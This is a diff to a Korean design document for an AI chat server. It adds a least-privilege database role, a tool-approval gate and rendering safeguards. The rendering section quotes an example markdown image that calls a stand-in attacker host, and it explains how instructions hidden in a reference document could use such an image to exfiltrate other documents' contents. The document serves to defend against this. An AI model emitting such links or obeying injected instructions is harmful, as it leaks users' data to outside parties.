@@ -36,6 +36,13 @@ Handler** 가 맡는다. BE(Spring)는 인증 판정과 업무 데이터의 원�
 
 ---
 
+## DB 최소 권한 — AI 서버는 `axcore_ai` 역할로 붙는다
+
+shared V16 이 `axcore_ai` 역할과 `shared.set_ai_role_password(text)` 를 만들고, 테넌트 V6 이 회사마다 `ai_*` 다섯 테이블과
+시퀀스에만 SELECT/INSERT/UPDATE/DELETE 를 준다. 비밀번호는 저장소에 없고 BE 가 부팅 때 `AI_DB_PASSWORD` 로 함수를 불러 설정한다
+(`AiDbRoleOnBoot`). Next 프로세스가 침해돼도 `shared.users` 나 다른 테이블에는 닿지 않는다. 새 `ai_` 테이블을 만들면 그
+마이그레이션에서 GRANT 를 같이 준다.
+
 ## 인증 — 모든 `/ai/*` 요청은 BE 판정을 거친다
 
 ```
@@ -112,13 +119,19 @@ POST /ai/sources (multipart files[])
 AI 메시지를 `meta`(추론 문구 · 도구 행 · 출처 · 요약 · 승인 카드)와 함께 저장한다. 편집·다시 시도는 `replaceFromSeq` 로 그 순번
 이후를 지우고 다시 답한다. 목록 · 조회 · 제목/선택 소스 수정 · 삭제 · 평가(`PATCH …/messages/:seq`)가 있고 전부 본인 대화만이다.
 
+## 답변 렌더링 안전장치
+
+- 마크다운 렌더러(`components/chat/markdown.tsx`)는 이미지를 그리지 않는다(`img` → 대체 텍스트). `![](https://공격자/x?d=…)` 가
+  답변에 섞이면 브라우저가 클릭 없이 그 주소를 GET 하므로, 참고 문서에 숨긴 지시로 다른 문서 내용을 유출시키는 경로가 된다.
+- `next.config.ts` 가 모든 응답에 `Content-Security-Policy: img-src 'self' data: blob: …` 를 붙여 두 번째 겹으로 막는다.
+
 ## 도구 안전장치 — `lib/ai/server/tools.ts`
 
 모델이 부를 수 있는 도구는 전부 레지스트리를 거친다. 사내 데이터 도구·MCP 는 아직 없고, 지금 있는 것은 실행 틀이다.
 
 | 장치 | 내용 |
 | --- | --- |
-| 승인 게이트 | `needsApproval` 도구는 실행하지 않고 `ai_tool_audit` 에 `proposed` 로 남긴 뒤 `data-approval` 카드를 띄운다. 사용자의 결정은 `action: tool-approval` 로 돌아오고, 서버는 **자기 기록의 입력으로** 실행한다. 한 승인 id 는 한 번만 쓰인다 |
+| 승인 게이트 | `needsApproval` 도구는 실행하지 않고 `ai_tool_audit` 에 `proposed` 로 남긴 뒤 `data-approval` 카드를 띄운다. 사용자의 결정은 `action: tool-approval` 로 돌아오고, 서버는 **자기 기록의 입력으로** 실행한다. 결정은 `UPDATE … WHERE status = 'proposed' RETURNING` 한 문장으로 선점해 동시 요청이 와도 한 승인은 정확히 한 번만 실행된다 |
 | 호출 횟수 | 턴당 `MAX_TOOL_STEPS`(6) 단계 (`stopWhen`) |
 | 시간 | 도구별 `timeoutMs`(기본 15초), 턴 전체 240초(nginx 300초보다 짧게) |
 | 크기 | 도구 출력 4,000자에서 잘라 모델에 준다. 감사 기록에는 앞 500자만 |
@@ -136,7 +149,8 @@ frontend 컨테이너(`docker-compose.yml`)에 들어가는 값. 로컬은 `FE/.
 | --- | --- | --- |
 | `AI_BE_BASE_URL` | introspect 를 물을 BE 주소 | `http://localhost:8080` (compose 는 `http://app:8080`) |
 | `AUTH_INTERNAL_TOKEN` | 서비스 간 비밀. BE 와 같은 값 | 없음 — 필수 |
-| `PGHOST` `PGPORT` `PGDATABASE` `PGUSER` `PGPASSWORD` | 테넌트 스키마 접근 (`pg` 표준) | 없음 — 필수 |
+| `PGHOST` `PGPORT` `PGDATABASE` | 테넌트 스키마 접근 (`pg` 표준) | 없음 — 필수 |
+| `PGUSER` `PGPASSWORD` | **AI 전용 역할** `axcore_ai`(`AI_DB_USER`) 와 `AI_DB_PASSWORD`. 슈퍼유저를 쓰지 않는다 | 없음 — 필수 |
 | `NCP_OBJECT_STORAGE_BUCKET` | 비공개 버킷 이름 | 없음 — 필수 |
 | `NCP_ACCESS_KEY` `NCP_SECRET_KEY` | 네이버 클라우드 API 인증키 | 없음 — 필수 |
 | `NCP_OBJECT_STORAGE_ENDPOINT` | | `https://kr.object.ncloudstorage.com` |
@@ -149,7 +163,7 @@ frontend 컨테이너(`docker-compose.yml`)에 들어가는 값. 로컬은 `FE/.
 | `AI_PG_POOL_MAX` | Next 쪽 커넥션 풀 | `5` |
 | `AI_DEMO_TOOLS` | `1` 이면 데모 도구 켜짐(개발 전용) | 꺼짐 |
 
-BE(app 컨테이너)에는 `AUTH_INTERNAL_TOKEN` 하나가 추가된다. `INFRA/.env` 에 `AUTH_INTERNAL_TOKEN`, `NCP_*`,
+BE(app 컨테이너)에는 `AUTH_INTERNAL_TOKEN` 과 `AI_DB_PASSWORD`(부팅 때 `axcore_ai` 역할 비밀번호를 맞춘다) 가 추가된다. `INFRA/.env` 에 `AUTH_INTERNAL_TOKEN`, `NCP_*`,
 `ANTHROPIC_API_KEY`, `OPENAI_API_KEY` 를 추가해야 한다(값은 이 저장소에 적지 않는다).
 
 ## 배포 시 할 일
